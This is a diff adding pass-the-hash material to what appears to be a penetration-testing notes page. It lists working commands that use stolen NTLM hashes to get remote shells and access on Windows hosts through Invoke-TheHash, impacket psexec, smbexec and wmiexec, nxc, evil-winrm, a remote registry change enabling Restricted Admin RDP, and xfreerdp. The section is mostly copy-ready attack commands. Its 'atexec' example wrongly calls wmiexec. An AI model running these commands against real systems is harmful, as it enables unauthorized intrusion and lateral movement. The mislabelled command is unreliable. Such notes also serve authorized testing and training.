@@ -390,3 +390,129 @@ mimikatz.exe privilege::debug "sekurlsa::pth /user:backup /rc4:f9e37e83b83c47a93
 
 <figure><img src="../.gitbook/assets/image (1695).png" alt=""><figcaption></figcaption></figure>
 
+### Using Invoke-TheHash&#x20;
+
+{% hint style="danger" %}
+_`cmd.exe` output redirection operators (e.g., `>`, `>>`) may create the file but fail to write the command output. The command still executes successfully._
+{% endhint %}
+
+{% code overflow="wrap" %}
+```powershell
+PS C:\Windows\System32\temp\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
+PS C:\Windows\System32\temp\Invoke-TheHash> Invoke-SMBExec -Target 192.168.16.143 -Domain mahisasura -Username bahubali -Hash 5a6e9ae4e4cfebb7539a4c89d52a1ace -Command "powershell -c `"whoami | Out-File C:\Temp\test.txt`"
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (1696).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/image (1697).png" alt=""><figcaption></figcaption></figure>
+
+<details>
+
+<summary><strong>Local Execution</strong></summary>
+
+<figure><img src="../.gitbook/assets/image (1698).png" alt=""><figcaption></figcaption></figure>
+
+</details>
+
+### Using Impacket&#x20;
+
+#### Using PsExec&#x20;
+
+{% code overflow="wrap" %}
+```bash
+impacket-psexec arjun@192.168.16.132 -hashes 8846f7eaee8fb117ad06bdd830b7586c
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (1699).png" alt=""><figcaption></figcaption></figure>
+
+#### Using smbexec&#x20;
+
+{% code overflow="wrap" %}
+```bash
+impacket-smbexec arjun@192.168.16.132 -hashes 8846f7eaee8fb117ad06bdd830b7586c
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (1700).png" alt=""><figcaption></figcaption></figure>
+
+#### Using wmiexec
+
+{% code overflow="wrap" %}
+```bash
+impacket-wmiexec arjun@192.168.16.132 -hashes 8846f7eaee8fb117ad06bdd830b7586c
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (1701).png" alt=""><figcaption></figcaption></figure>
+
+#### Using atexec
+
+{% code overflow="wrap" %}
+```bash
+impacket-wmiexec arjun@192.168.16.132 whoami -hashes 8846f7eaee8fb117ad06bdd830b7586c
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (1702).png" alt=""><figcaption></figcaption></figure>
+
+### Using nxc&#x20;
+
+{% code overflow="wrap" %}
+```bash
+nxc smb 192.168.16.132 --shares -u 'arjun' -d . -H 8846f7eaee8fb117ad06bdd830b7586c
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (1703).png" alt=""><figcaption></figcaption></figure>
+
+### Using evil-winrm
+
+{% code overflow="wrap" %}
+```bash
+evil-winrm -u arjun -i 192.168.16.132 -H 8846f7eaee8fb117ad06bdd830b7586c
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (1704).png" alt=""><figcaption></figcaption></figure>
+
+### Using RDP&#x20;
+
+<details>
+
+<summary><strong>Case (Restricted Admin Mode)</strong></summary>
+
+* `Restricted Admin Mode`, which is disabled by default, should be enabled on the target host; otherwise, you will be presented with the following error:
+
+<figure><img src="../.gitbook/assets/image (1705).png" alt=""><figcaption></figcaption></figure>
+
+</details>
+
+#### Enable Restricted admin mode&#x20;
+
+{% code overflow="wrap" %}
+```bash
+impacket-reg arjun@192.168.16.132 add -keyName "HKLM\System\CurrentControlSet\Control\Lsa" -vt REG_DWORD -v DisableRestrictedAdmin -vd 0
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (1706).png" alt=""><figcaption></figcaption></figure>
+
+#### Pass-the-Hash&#x20;
+
+{% code overflow="wrap" %}
+```bash
+xfreerdp /v:192.168.16.132 /u:arjun /pth:8846f7eaee8fb117ad06bdd830b7586c
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (1707).png" alt=""><figcaption></figcaption></figure>
+
+<details>
+
+<summary><strong>UAC limits</strong> </summary>
+
+UAC (User Account Control) limits local users' ability to perform remote administration operations. When the registry key `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` is set to 0, it means that the built-in local admin account (RID-500, "Administrator") is the only local account allowed to perform remote administration tasks. Setting it to 1 allows the other local admins as well.
+
+</details>
